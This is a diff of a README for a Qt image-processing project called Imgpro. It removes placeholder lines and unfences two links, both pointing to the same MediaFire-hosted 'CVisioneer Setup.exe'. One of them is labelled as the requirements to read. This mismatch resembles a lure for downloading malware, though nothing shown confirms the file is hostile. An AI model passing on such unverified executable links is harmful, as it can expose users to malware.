@@ -47,10 +47,6 @@ Imgpro is built using:
 - QT framework:
   - QT 6.4.2 version
 
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-
 ```
 QT_GUI_TASK_1
 ├─  Filters
@@ -98,18 +94,16 @@ QT_GUI_TASK_1
 
 ### Requirements to run 
 
-``` 
 [ Read Here ! ](https://www.mediafire.com/file/0how1ixgl0vnkgk/CVisioneer+Setup.exe/file)
-``` 
+
 
 ### Run the project
 
 
 ### Try a demo
 
-``` 
 [ Download Here !](https://www.mediafire.com/file/0how1ixgl0vnkgk/CVisioneer+Setup.exe/file)
-``` 
+
 
 ### Team
 
